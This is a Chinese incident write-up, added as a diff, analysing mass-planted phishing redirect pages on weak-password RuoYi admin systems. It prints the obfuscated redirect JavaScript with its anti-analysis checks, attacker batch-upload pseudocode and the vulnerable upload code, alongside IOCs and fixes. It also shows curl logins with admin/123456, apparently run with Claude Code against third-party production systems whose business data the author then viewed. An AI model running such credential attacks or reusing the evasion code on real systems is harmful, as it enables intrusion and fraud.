@@ -1,0 +1,561 @@
+# RuoYi框架批量挂马事件深度溯源分析
+
+> **作者**: 安全研究员  
+> **日期**: 2026年6月1日  
+> **标签**: #挂马 #RuoYi #文件上传漏洞 #黑产溯源 #SRC
+
+---
+
+## 0x00 前言
+
+近日在QQ群中发现有人公开传播博彩、色情等违法网站引流。
+
+![QQ群中的黑产广告](images/黑产发现（qq群）.png)
+
+经过深入追踪，发现这些"站群"实际上是通过**批量入侵合法网站、利用RuoYi框架文件上传漏洞植入恶意跳板页面**实现的。本文将完整还原从线索发现到深度溯源的全过程。
+
+> **声明**：本文涉及的目标系统信息已做脱敏处理，IP地址、企业名称等均以代号替代。
+
+---
+
+## 0x01 线索发现与初步分析
+
+### 1.1 获取挂马URL样本
+
+通过调查获取到一批挂马URL（已脱敏）：
+
+```
+http://[目标A-IP]:9300/prod-api/profile/upload/2026/05/26/list_20260526234713A054.html?%12&ck=NHR0Z2h3LjhqMTZpLmdzcS9LODAySmJVSHU=
+http://[目标B-IP]:8888/prod-api/profile/upload/2026/05/18/232056a2-a413-4672-b8fa-635f94f83a29.html?%12&ck=NnZ2aWp5Ll9sMzhrLml1cy9NXzI0TGRXSnc=
+http://[目标C-IP]:9001/prod-api/profile/upload/2026/05/18/c785e57c-8d0c-4034-9aa3-630485975a8e.html?%12&ck=NnZ2aWp5Ll9sMzhrLml1cy9NXzI0TGRXSnc=
+http://[目标D-IP]/prod-api/profile/upload/2026/05/26/list_20260526234717A053.html?%12&ck=MXFxZGV0LjVneTNmLmRwbi9INXh6R1lSRXI=
+```
+
+共同特征：
+
+- 使用IP直接访问（非域名）
+- 路径都是 `/prod-api/profile/upload/`（按日期分目录）
+- 文件类型 `.html`
+- URL参数包含 `ck`（Base64编码）和随机干扰字符
+
+### 1.2 目标系统识别
+
+| 代号  | 端口 | 系统名称       | 后端框架     | 云厂商       |
+| ----- | ---- | -------------- | ------------ | ------------ |
+| 目标A | 9300 | 某RPA管理系统  | RuoYi v3.8.5 | 某移动运营商 |
+| 目标B | 8888 | 某应用商城后台 | 某应用平台   | 某云厂商A    |
+| 目标B | 9001 | 某专利解析平台 | Spring Boot  | 某云厂商A    |
+| 目标C | 9001 | 某行政审批系统 | Spring Boot  | 某电信运营商 |
+| 目标D | 80   | 某企业管理系统 | RuoYi v3.8.5 | 某云厂商B    |
+
+![某RPA管理系统原站](images/site_target_a.png)
+*目标A：某RPA管理系统首页*
+
+![某应用商城后台](images/site_target_b_8888.png)
+*目标B：某应用商城后台*
+
+![某专利解析平台](images/site_target_b_9001.png)
+*目标B：某专利解析平台*
+
+![某行政审批系统](images/site_target_c.png)
+*目标C：某行政审批系统*
+
+![某企业管理系统](images/site_target_d.png)
+*目标D：某企业管理系统首页*
+
+### 1.3 后端框架确认
+
+通过访问 `/prod-api/` 接口，确认后端框架：
+
+![RuoYi版本信息](images/api_version_a.png)
+*目标A 返回 "欢迎使用后台管理框架，当前版本：v3.8.5"*
+
+![RuoYi版本信息](images/api_version_d.png)
+*目标D 返回相同信息*
+
+两个目标都使用了 **RuoYi v3.8.5** 后台管理框架。
+
+### 1.4 弱口令发现
+
+**使用Claude Code进行自动化安全测试**，对RuoYi系统进行弱口令爆破：
+
+```bash
+# Claude Code辅助的弱口令测试
+curl -X POST "http://[目标A-IP]:9300/prod-api/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"123456"}'
+
+curl -X POST "http://[目标D-IP]/prod-api/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"123456"}'
+```
+
+测试结果：
+
+- **目标A**: `admin/123456` 登录成功
+- **目标D**: `admin/123456` 登录成功
+
+登录后发现这是**正常的业务系统**，有真实的业务数据，并非攻击者搭建的钓鱼站。
+
+![登录页面](images/login_a.png)
+*目标A登录页面*
+
+![登录页面](images/login_d.png)
+*目标D登录页面*
+
+---
+
+## 0x02 挂马样本深度分析
+
+### 2.1 恶意页面结构
+
+访问挂马URL，所有页面结构完全一致：
+
+![挂马页面](images/malware_a.png)
+*目标A挂马页面 - 标题为"心念"*
+
+![挂马页面](images/malware_b.png)
+*目标B挂马页面*
+
+![挂马页面](images/malware_c.png)
+*目标C挂马页面*
+
+![挂马页面](images/malware_d.png)
+*目标D挂马页面*
+
+HTML结构分析：
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- 防止referrer泄露来源 -->
+    <meta name="referrer" content="unsafe-url">
+    <title>心念</title>
+    <style>
+        /* 全屏白色遮罩 + 加载动画 */
+        html,body,iframe { width:100%; height:100%; border:0; }
+        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; 
+                   background-color:#ffffff; z-index:9999; }
+        .spinner { /* 绿色旋转加载动画 */ }
+    </style>
+</head>
+<body>
+    <!-- 白色遮罩 + 加载动画 -->
+    <div id="overlay">
+        <div class="spinner"></div>
+    </div>
+    <!-- 混淆的恶意JavaScript -->
+    <script>
+        var _0xodf='jsjiami.com.v7';
+        // ... RC4加密的恶意代码 ...
+    </script>
+</body>
+</html>
+```
+
+### 2.2 JS混淆分析
+
+恶意JS使用 `jsjiami.com.v7` 进行混淆，核心逻辑：
+
+```
+1. 检查 URL 是否包含 'ck' 参数
+2. 如果包含，清空页面内容
+3. 创建 div#content 容器
+4. 用 RC4 算法解密 ck 参数，得到中间编码字符串
+5. 动态创建 <script> 标签加载外部脚本
+```
+
+---
+
+## 0x03 攻击链完整还原
+
+### 3.1 外部脚本加载
+
+通过Playwright模拟浏览器执行，捕获到恶意JS的实际网络请求：
+
+```
+[document] GET http://[目标IP]/.../malware.html?ck=...
+[script]   GET https://[恶意域名A]/qqzy/search.js    ← 加载外部恶意脚本
+[xhr]      GET https://[恶意域名B]/qqzy/              ← 获取钓鱼配置
+[document] GET https://www.baidu.com/                 ← 跳转百度作为伪装
+```
+
+**关键发现：** 所有挂马页面加载的外部脚本都是同一个。
+
+### 3.2 search.js 恶意脚本分析
+
+这是一个精心设计的恶意脚本，包含多层反分析机制：
+
+#### 3.2.1 反自动化检测
+
+```javascript
+function check() {
+    const suspiciousUserAgents = [
+        'scrapy', 'requests', 'curl', 'wget', 'python', 
+        'java', 'bot', 'spider', 'crawler', 'headless'
+    ];
+    const ua = navigator.userAgent.toLowerCase();
+    if (suspiciousUserAgents.some(keyword => ua.includes(keyword))) {
+        window.location.href = "https://www.baidu.com";  // 检测到爬虫→跳转百度
+        return;
+    }
+}
+```
+
+#### 3.2.2 WebDriver检测
+
+```javascript
+function uaCheck() {
+    // 检测Selenium/Playwright等自动化工具
+    if (navigator.webdriver === true) {
+        window.location.href = "https://www.baidu.com";
+        return;    
+    }
+    
+    // 只允许移动设备访问（QQ/微信内置浏览器）
+    const isMobile = /mobile|android|iphone|ipad|ipod|phone|tablet/i.test(ua);
+    const isQQ = ua.includes('qq/') || ua.includes('mqqbrowser');
+    const isWX = ua.includes('micromessenger');
+    
+    // 准入策略：只允许QQ/微信内置浏览器或移动设备
+    const allowed = (isQQ && qqVerOk) || (isWX) || (isMobile && hasTouch);
+    if (!allowed) {
+        window.location.href = "https://www.baidu.com";
+        return;
+    }
+}
+```
+
+#### 3.2.3 ck参数解密与URL构造
+
+```javascript
+function getFrameUrl() {
+    var ck = getQueryString('ck');        // 从URL获取ck参数
+    var decoded = atob(ck);              // Base64解码
+    var decrypted = this.ultraDecrypt(decoded);  // 替换密码解密
+    var parts = decrypted.split('/');
+    var random = getRandomString(7);     // 7位随机字符串
+    var scope = getCurrentScope();       // 当前时间戳
+    
+    // 构造最终URL: http://域名/随机串/路径/时间戳.html
+    let url = 'http://' + parts[0] + '/' + random + '/' + parts[1];
+    if (parts[2]) {
+        url += '/' + scope + '/' + parts[2];
+    } else {
+        url += '/' + scope + '.html';
+    }
+    return url;
+}
+
+// 替换密码解密算法
+function ultraDecrypt(encrypted) {
+    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
+    const shift = parseInt(encrypted[0]);  // 第一个字符作为位移量
+    let result = '';
+    for (let i = 1; i < encrypted.length; i++) {
+        const idx = alphabet.indexOf(encrypted[i]);
+        if (idx !== -1) {
+            let newIdx = idx - shift;
+            if (newIdx < 0) newIdx += alphabet.length;
+            result += alphabet[newIdx];
+        } else {
+            result += encrypted[i];
+        }
+    }
+    return result;
+}
+```
+
+### 3.3 ck参数解密结果
+
+所有URL的ck参数解密后，都指向**同一个钓鱼域名**：
+
+| 来源  | ck(Base64)    | Base64解密                   | ultraDecrypt结果    |
+| ----- | ------------- | ---------------------------- | ------------------- |
+| 目标A | `NHR0Z2h3...` | `4ttghw.8j16i.gsq/K802JbUHu` | `[钓鱼域名]/[路径]` |
+| 目标B | `NnZ2aWp5...` | `6vvijy._l38k.ius/M_24LdWJw` | `[钓鱼域名]/[路径]` |
+| 目标C | `NnZ2aWp5...` | `6vvijy._l38k.ius/M_24LdWJw` | `[钓鱼域名]/[路径]` |
+| 目标D | `MXFxZGV0...` | `1qqdet.5gy3f.dpn/H5xzGYREr` | `[钓鱼域名]/[路径]` |
+
+**钓鱼目标URL格式：**
+
+```
+http://[钓鱼域名]/[7位随机串]/[路径]/[时间戳].html
+```
+
+### 3.4 钓鱼目标域名分析
+
+**域名：** `[钓鱼域名]`
+
+- **注册商：** 某域名注册服务商
+- **创建时间：** 2025-03-01
+- **到期时间：** 2027-03-01
+- **DNS：** 某高防DNS服务（隐藏真实IP）
+- **技术栈：** Vue.js SPA单页应用
+- **页面标题：** "心念"
+
+### 3.5 完整攻击流程图
+
+```
+用户在QQ/微信群中点击链接
+    ↓
+访问挂马URL（如 http://[目标IP]/.../malware.html?ck=xxx）
+    ↓
+页面加载，显示白色遮罩+加载动画
+    ↓
+JS检查URL中的 ck 参数
+    ↓
+Base64解码 + ultraDecrypt替换密码解密 → 得到钓鱼域名
+    ↓
+加载外部脚本 https://[恶意域名A]/qqzy/search.js
+    ↓
+search.js 执行反分析检查：
+  ├─ 检测爬虫/自动化工具 → 跳转百度（伪装）
+  ├─ 检测PC端浏览器 → 跳转百度（伪装）
+  └─ 检测移动设备/QQ/微信 → 继续执行
+    ↓
+构造最终钓鱼URL: http://[钓鱼域名]/[随机]/[路径]/[时间戳].html
+    ↓
+创建iframe加载钓鱼页面（博彩/色情/虚假投资等）
+    ↓
+用户被骗
+```
+
+---
+
+## 0x04 漏洞溯源：如何造成挂马
+
+### 4.1 漏洞根因
+
+挂马的根本原因是 **RuoYi框架文件上传漏洞 + 弱口令**。
+
+**漏洞位置：** `/prod-api/profile/upload/`
+
+RuoYi v3.8.5 的文件上传控制器代码：
+
+```java
+@PostMapping("/profile/upload")
+public AjaxResult uploadFile(MultipartFile file) {
+    try {
+        // ❌ 漏洞点：未校验文件类型
+        String fileName = FileUploadUtils.upload(RuoYiConfig.getUploadPath(), file);
+        String url = serverConfig.getUrl() + fileName;
+        AjaxResult ajax = AjaxResult.success();
+        ajax.put("fileName", fileName);
+        ajax.put("url", url);
+        return ajax;
+    } catch (Exception e) {
+        return AjaxResult.error(e.getMessage());
+    }
+}
+```
+
+**关键问题：**
+
+1. **未校验文件扩展名**：允许上传 `.html`、`.js` 等可执行文件
+2. **路径可预测**：按日期分目录 `/upload/YYYY/MM/DD/`
+3. **弱口令**：默认 `admin/123456` 未修改
+
+### 4.2 攻击者入侵流程
+
+```
+1. 批量扫描互联网上的RuoYi系统（/prod-api/ 路径识别）
+   ↓
+2. 尝试默认弱口令（admin/123456、admin/admin888等）
+   ↓
+3. 登录后台管理系统
+   ↓
+4. 找到文件上传功能（头像上传、文件管理等）
+   ↓
+5. 上传恶意HTML文件（挂马跳板页面）
+   ↓
+6. 获取上传后的URL
+   ↓
+7. 在URL后添加 ck 参数（加密的钓鱼目标）
+   ↓
+8. 将URL发布到QQ群/微信群用于诈骗引流
+```
+
+### 4.3 为什么能批量操作
+
+攻击者使用自动化工具：
+
+```python
+# 攻击者的自动化脚本逻辑（推测）
+targets = load_from_scan_result("ruoyi_targets.txt")
+
+for target in targets:
+    # 1. 尝试弱口令
+    if try_login(target, "admin", "123456"):
+        # 2. 上传恶意HTML
+        malware_url = upload_malware(target, "malware_template.html")
+        # 3. 生成带ck参数的URL
+        phishing_url = malware_url + "?ck=" + generate_ck("[钓鱼域名]/[路径]")
+        # 4. 记录结果
+        save_result(target, phishing_url)
+```
+
+这就是为什么能以388元/10个站点的价格出售"站群"服务——**边际成本极低，全自动化**。
+
+---
+
+## 0x05 IOC (Indicators of Compromise)
+
+### 5.1 恶意域名IOC
+
+| 域域名        | 用途         | 注册商       | 创建时间   |
+| ------------- | ------------ | ------------ | ---------- |
+| `[恶意域名A]` | 恶意脚本分发 | 某域名注册商 | 2025-03-01 |
+| `[恶意域名B]` | 钓鱼配置下发 | 某域名注册商 | 2024-11-12 |
+| `[钓鱼域名]`  | 钓鱼目标站点 | 某域名注册商 | 2025-03-01 |
+
+### 5.2 特征IOC
+
+| 类型       | 值                                   |
+| ---------- | ------------------------------------ |
+| 页面标题   | `心念`                               |
+| JS混淆工具 | `jsjiami.com.v7`                     |
+| URL参数    | `ck` (Base64 + ultraDecrypt替换密码) |
+| 上传路径   | `/prod-api/profile/upload/`          |
+| 文件类型   | `.html`                              |
+| 后端框架   | RuoYi v3.8.5                         |
+| DNS服务商  | 某高防DNS服务                        |
+
+### 5.3 search.js中的安全域名白名单
+
+search.js中硬编码了约70+个"安全域名"白名单，这些域名被允许加载钓鱼内容。这些域名很可能都是同一个黑产团伙控制的钓鱼/诈骗站点。
+
+---
+
+## 0x06 各目标详细分析
+
+### 6.1 目标A：某RPA管理系统
+
+| 字段     | 值                |
+| -------- | ----------------- |
+| 系统类型 | RPA自动化管理系统 |
+| 后端框架 | RuoYi v3.8.5      |
+| 云厂商   | 某移动运营商      |
+| 弱口令   | admin/123456 ✓    |
+| 挂马时间 | 2026-05-26        |
+
+![目标A API信息](images/api_version_a.png)
+
+### 6.2 目标B：某云厂商服务器
+
+| 字段     | 值                          |
+| -------- | --------------------------- |
+| 系统类型 | 应用商城后台 / 专利解析平台 |
+| 平台     | 某应用平台                  |
+| 云厂商   | 某云厂商A                   |
+| 挂马时间 | 2026-05-18                  |
+
+同一服务器运行多个应用（端口80/8888/9001），攻击者可能通过其中一个应用入侵后横向扩展。
+
+![目标B 80端口](images/site_b_80.png)
+*80端口的分析平台*
+
+### 6.3 目标C：某行政审批系统
+
+| 字段     | 值                   |
+| -------- | -------------------- |
+| 系统类型 | 行政审批辅助业务系统 |
+| 云厂商   | 某电信运营商         |
+| 挂马时间 | 2026-05-18           |
+
+**政务系统被挂马，影响最为严重。**
+
+![目标C 80端口](images/no_site_c.png)
+*80端口返回"没有找到站点"*
+
+### 6.4 目标D：某企业管理系统
+
+| 字段     | 值             |
+| -------- | -------------- |
+| 系统类型 | 企业管理系统   |
+| 后端框架 | RuoYi v3.8.5   |
+| 云厂商   | 某云厂商B      |
+| 弱口令   | admin/123456 ✓ |
+| 挂马时间 | 2026-05-26     |
+
+![Spring Boot错误页面](images/springboot_error_d.png)
+*Spring Boot错误页面*
+
+---
+
+## 0x07 修复建议
+
+### 7.1 紧急措施
+
+1. **清理恶意文件**：删除 `/prod-api/profile/upload/` 目录下的所有 `.html` 文件
+2. **修改弱口令**：立即修改所有管理员账户的默认密码
+3. **限制上传接口**：临时关闭或限制文件上传功能
+
+### 7.2 长期防护
+
+1. **文件上传白名单**
+
+```java
+@PostMapping("/profile/upload")
+public AjaxResult uploadFile(MultipartFile file) {
+    // ✅ 添加文件类型白名单
+    String[] allowedTypes = {"image/jpeg", "image/png", "image/gif"};
+    if (!Arrays.asList(allowedTypes).contains(file.getContentType())) {
+        return AjaxResult.error("不支持的文件类型");
+    }
+    
+    // ✅ 校验文件扩展名
+    String ext = FilenameUtils.getExtension(file.getOriginalFilename());
+    if (!Arrays.asList("jpg","jpeg","png","gif").contains(ext.toLowerCase())) {
+        return AjaxResult.error("不支持的文件扩展名");
+    }
+    
+    // 上传逻辑...
+}
+```
+
+2. **强制密码策略**：密码包含大小写+数字+特殊字符，长度≥8位
+3. **登录失败锁定**：连续5次失败后锁定15分钟
+4. **WAF规则**：拦截 `/prod-api/profile/upload/` 路径的非图片文件上传
+5. **定期安全审计**：检查上传目录、日志、异常文件
+
+---
+
+## 0x08 总结
+
+本次挂马事件的核心是 **RuoYi框架文件上传漏洞 + 弱口令**，攻击者利用这两个弱点批量入侵合法网站，植入恶意跳板页面，最终引流到钓鱼/诈骗站点。
+
+**攻击链总结：**
+
+```
+弱口令登录 → 上传恶意HTML → 加载外部脚本(search.js) 
+→ 反分析检测 → 解密ck参数 → 跳转钓鱼站点
+```
+
+**关键发现：**
+
+- 所有被挂马目标最终都指向同一个钓鱼域名
+- 恶意脚本包含完善的反分析机制
+- 只允许QQ/微信内置浏览器或移动设备访问，PC端自动跳转百度伪装
+- 黑产团伙通过QQ群公开出售"站群"服务，价格低至38.8元/站点
+
+---
+
+## 0x09 附录
+
+### A. 相关工具
+
+- [Claude Code](https://claude.ai/code) - AI辅助安全分析
+- [Playwright](https://playwright.dev/) - 页面截图和网络请求分析
+- [jsjiami.com](https://www.jsjiami.com/) - JS混淆工具（被攻击者滥用）
+
+### B. 参考资料
+
+- [RuoYi官方文档](http://doc.ruoyi.vip/)
+- [OWASP文件上传漏洞](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
+
+---
+
+*本文仅供安全研究和学习使用，请勿用于非法用途。文中涉及的目标系统信息已做脱敏处理。*
